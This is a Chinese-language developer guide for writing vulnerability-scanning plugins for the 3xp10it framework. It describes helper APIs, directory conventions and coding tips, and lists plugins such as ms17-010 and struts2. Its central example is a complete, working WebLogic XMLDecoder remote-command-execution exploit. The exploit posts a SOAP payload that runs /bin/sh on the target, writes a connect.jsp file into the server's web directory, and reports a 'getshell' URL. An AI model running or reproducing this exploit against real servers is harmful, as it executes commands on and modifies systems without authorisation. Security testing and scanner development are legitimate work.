### 插件开发


#### 0x00 About

1.开发的插件为具体的某一中高危漏洞扫描插件,如joomla远程执行漏洞插件,weblogic命令执行插件,wordpress sql注入插件

2.脚本中的target统一设置为`sys.argv[1]`,`sys.argv[1]`的值为目标url

3.github贡献插件地址为3xp10it项目的exps目录,也即https://github.com/3xp10it/exp10it/tree/master/exps

```
# 目标url可为以下3种:
# eg:
# 1.http://www.baidu.com:8080/cms/
# 2.http://www.baidu.com
# 3.http://www.baidu.com:8081/cms/index.php
```

#### 0x01 主要API

```
cms_url = get_cms_entry_from_start_url(target):
    简介:用于整理一个url的cms入口
    参数:target为目标url
    返回值:目标url的cms入口地址
    用法示例:
    get_cms_entry_from_start_url("http://www.baidu.com:8081/cms/index.php")的返回值为:
        "http://www.baidu.com:8081/cms/"
    get_cms_entry_from_start_url("http://www.baidu.com:8081/cms")的返回值为:
        "http://www.baidu.com:8081/cms/"
    get_cms_entry_from_start_url("http://www.baidu.com:8081")的返回值为:
        "http://www.baidu.com:8081/"

get_target_urls_from_db(target,"exp10itdb"):
    简介:用于从数据库中取出已经完成的爬虫后的目标的所有url,用于漏洞检测
    参数:target为目标url,目前第2个参数固定为"exp10itdb"
    返回值:目标url列表,返回值是列表形式,列表中的第个值为url,但是有类特殊的url(url中包含"^"符号),这类特殊的url表示
           post类型的url,"^"之后的值为post的内容
    用法示例:
    get_target_urls_from_db("https://www.baidu.com/cms","exp10itdb")的返回值为:
    ['https://www.baidu.com/cms/admin.php',
    'https://www.baidu.com/cms/index.php?a=1&b=2',
    'https://www.baidu.com/cms/upload.php^filename=1.php&Submit=Submit',
    'https://www.baidu.com/cms/about.php',
    'https://www.baidu.com/cms/manage.php']

get_target_open_port_list(target):
    简介:从数据库中取出已经有的端口信息
    参数:target为目标url
    返回值:目标打开的端口信息,返回值为列表形式,如['80','8080','3306']
    用法示例:
    get_target_open_port_list("http://www.baidu.com:8081/cms/login.html")的返回值为:
    ["80","8080","3306","3389"]

COMMON_NOT_WEB_PORT_LIST= ['21', '22', '53', '137','139', '145', '445', '1433', '3306', '3389']
    这是一个常量,值的类型是列表,定义在在exp10it模块中
```

#### 0x02 插件目录结构

```
    插件放到一个新建的目录中,插件名与目录名相同
    eg:
    制作一个weblogic漏洞检测插件时,要新建一个weblogic目录,并在weblogic目录下新建weblogic.py,weblogic.py为要编写的
    插件,weblogic目录下如果检测到有漏洞需要生成一个result.txt,没有则不用生成,weblogic目录下可以有除weblogic.py外
    的用于检测漏洞的其他文件,也可没有其他文件,例如,检测到有漏洞后的weblogic目录下结构为(如果weblogic.py运行完后没
    有检测到漏洞则没有result.txt):

    weblogic/
    ├── result.txt
    └── weblogic.py
```

#### 0x03 插件建议

    1.目录命名时以下划线为连接符(如果目录名较长),目录名命名要能尽量反映出漏洞情况,如某个插件目录名为joomla_rce

    2.如果有多个网络请求,建议用多线程,eg:

    from concurrent import futures
    with futures.ThreadPoolExecutor(max_workers=15) as executor:
        executor.map(check, test_url_list)

    3.如果检测漏洞的过程中要用到临时文件,建议设置这个临时文件为"/tmp/xxx+"+str(time.time()),如:
        如果weblogic需要用到临时文件存放一些内容,建议临时文件设置为"/tmp/weblogic_1512724639.5173461",临时文件创
        建后记得删除(这里只是举个例子,下面的weblogic漏洞检测插件没有用到临时文件)

    4.插件建议只是建议,并不一定得这样,但是这样肯定是更好的,也有利于减少bug的产生和规范插件编写

#### 0x04 插件示例

如下为weblogic命令执行漏洞检测插件示例,详情见代码及注释

```
import requests
import sys
import re
import os
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from exp10it import COMMON_NOT_WEB_PORT_LIST
from exp10it import CLIOutput
from urllib.parse import urlparse
from exp10it import get_cms_entry_from_start_url
from exp10it import get_target_open_port_list

# 禁用安全请求警告
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
current_dir = os.path.split(os.path.realpath(__file__))[0]


# 判断漏洞是否存在
target = sys.argv[1]
# 传入的target是目标url,目标url有3种:
# eg:
# 1.http://www.baidu.com:8080/cms/
# 2.http://www.baidu.com
# 3.http://www.baidu.com:8081/cms/index.php

test_url_list = []
cms_url = get_cms_entry_from_start_url(target)
# get_cms_entry_from_start_url函数将获取target的cms入口,eg:
# target="http://www.baidu.com:8081/cms/index.php"时,函数返回值为"http://www.baidu.com:8081/cms/"
# target="http://www.baidu.com:8081/cms"时,函数返回值为"http://www.baidu.com:8081/cms/"
# target="http://www.baidu.com:8081"时,函数返回值为"http://www.baidu.com:8081/"

parsed = urlparse(target)
test_url_list.append(cms_url)

open_port_list = get_target_open_port_list(target)

for port in open_port_list:
    if port not in COMMON_NOT_WEB_PORT_LIST:
        test_url_list.append(parsed.scheme + "://" +
                             parsed.hostname + ":" + port)


def check(url):
    # 判断weblogic漏洞是否存在的地址
    check_addr = '/wls-wsat/CoordinatorPortType11'
    shell_addr = '/bea_wls_internal/connect.jsp'
    vuln_url = url + check_addr
    heads = {'User-Agent': 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36',
             'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
             'Accept-Language': 'zh-CN,zh;q=0.8',
             'SOAPAction': "",
             'Content-Type': 'text/xml;charset=UTF-8'
             }

    postStr = '''
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">  
  <soapenv:Header> 
    <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">  
      <java> 
        <object class="java.lang.ProcessBuilder"> 
          <array class="java.lang.String" length="3"> 
            <void index="0"> 
              <string>/bin/sh</string> 
            </void>  
            <void index="1"> 
              <string>-c</string> 
            </void>  
            <void index="2"> 
              <string>find $DOMAIN_HOME -type d -name bea_wls_internal|while read f;do find $f -type 
              f -name index.html;done|while read ff;do echo vulexist>$(dirname $ff)/connect.jsp;
              done</string>
            </void> 
          </array>  
          <void method="start"/> 
        </object> 
      </java> 
    </work:WorkContext> 
  </soapenv:Header>  
  <soapenv:Body/> 
</soapenv:Envelope>
'''

    content = requests.get(vuln_url, verify=False, timeout=10)
    if content.status_code == 200:
        rsp = requests.post(vuln_url, headers=heads, data=postStr.encode(
            "utf-8"), verify=False, timeout=10)
        content = rsp.content
        import chardet
        bytesEncoding = chardet.detect(content)['encoding']
        content = content.decode(bytesEncoding)

        if re.search(r"java\.lang\.ProcessBuilder", content, re.I):
            # print "getshell success,shell is:%s"%(url+shell_addr)
            string_to_write = "Congratulations! weblogic 远程命令执行漏洞存在:\n" + url + shell_addr + "\n"
            CLIOutput().good_print(string_to_write)
            with open("%s/result.txt" % current_dir, "a+") as f:
                f.write(string_to_write)
        else:
            print("失败")
    else:
        print(content.status_code)


from concurrent import futures
with futures.ThreadPoolExecutor(max_workers=15) as executor:
    executor.map(check, test_url_list)
```

#### 0x04 已有插件列表

已有插件目录在[这里][2],目前如下,最新列表以链接中具体情况为准

```
cmdi                                ===>    命令注入漏洞
code_leak                           ===>    代码泄露漏洞
heartbleed                          ===>    心脏滴血漏洞
iis                                 ===>    iis6漏洞
j_security_check                    ===>    登陆无验证码漏洞
joomla_rce                          ===>    joomla远程命令执行漏洞
lfi                                 ===>    文件包含漏洞
ms08-067                            ===>    ms08-067漏洞
ms17-010                            ===>    ms17-010漏洞
shellshock                          ===>    shellshock漏洞
solr                                ===>    solr直进后台漏洞
struts2                             ===>    struts2漏洞
uddiexplorer_SearchPublicRegistries ===>    一个ssrf漏洞
unauthorize                         ===>    平行越权漏洞
weblogic                            ===>    weblogic反序列化漏洞
```

#### 0x05 其它

3xp10it框架存入数据相关结构(在编写插件时一般用不到)在[这里][1]


[1]: https://github.com/3xp10it/exp10it/blob/master/store.md
[2]: https://github.com/3xp10it/exp10it/tree/master/exps
